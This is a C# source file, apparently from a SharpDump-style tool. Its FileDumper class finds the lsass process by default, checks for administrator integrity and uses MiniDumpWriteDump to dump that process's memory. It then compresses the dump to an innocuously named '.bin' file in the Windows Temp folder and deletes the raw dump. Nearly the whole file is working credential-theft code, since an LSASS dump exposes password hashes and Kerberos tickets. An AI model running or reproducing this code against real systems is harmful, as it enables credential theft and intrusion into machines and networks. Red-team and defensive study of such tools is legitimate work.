using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using SharpDump.Interfeces;

namespace SharpDump
{
    public class FileDumper
    {
        private readonly IFileCompressor _fileCompressor = new FileCompressor();
        private readonly IWorkingWithFile _workingWithFile = new WorkingWithFile();
        private readonly IMessages _messages = new Messages();
        
        // partially adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/

        // Overload supporting MiniDumpExceptionInformation == NULL
        [DllImport(
            "dbghelp.dll", 
            EntryPoint = "MiniDumpWriteDump", 
            CallingConvention = CallingConvention.StdCall, 
            CharSet = CharSet.Unicode, 
            ExactSpelling = true, 
            SetLastError = true)]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess, 
            uint processId, 
            SafeHandle hFile, 
            uint dumpType, 
            IntPtr expParam, 
            IntPtr userStreamParam, 
            IntPtr callbackParam);

        public void MiniDump(int pid = -1)
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                Process[] processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception ex)
                {
                    // often errors if we can't get a handle to LSASS
                    throw new Exception(ex.Message);
                }
            }

            if (targetProcess.ProcessName == "lsass" && !HighIntegrityAnalyzer.IsHighIntegrity())
            {
                throw new Exception("Not in high integrity, unable to MiniDump!");
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                String str = "Error getting handle to " + targetProcess.ProcessName.ToString() + targetProcess.Id.ToString();
                throw new Exception(str);
            }
            bool bRet = false;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = $"{systemRoot}\\Temp\\debug{targetProcessId}.out";
            string zipFile = $"{systemRoot}\\Temp\\debug{targetProcessId}.bin";

            Console.WriteLine(_messages.DumpingTargetProcessToDumpFile(targetProcess, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if (bRet)
            {
                FileProcessing(dumpFile, zipFile, targetProcessId, pid);
            }
            else
            {
                throw new ApplicationException("Dump failed");
            }
        }


        public void FileProcessing(string dumpFile, string zipFile, uint targetProcessId,int pid)
        {
            Console.WriteLine(_messages.DumpSuccessfulAndCompressing(dumpFile,zipFile));
            _fileCompressor.Compress(dumpFile, zipFile);

            Console.WriteLine(_messages.Deleting(dumpFile));
            _workingWithFile.FileDelete(dumpFile);
            Console.WriteLine(_messages.DumpingCompleted(targetProcessId));

            string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            string OS = "";
            var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            if (regKey != null)
            {
                OS = $"{regKey.GetValue("ProductName")}";
            }

            if (pid == -1)
            {
                Console.WriteLine(_messages.OperatingSystemAndArchitecture(OS, arch));
            }
        }
    }
}
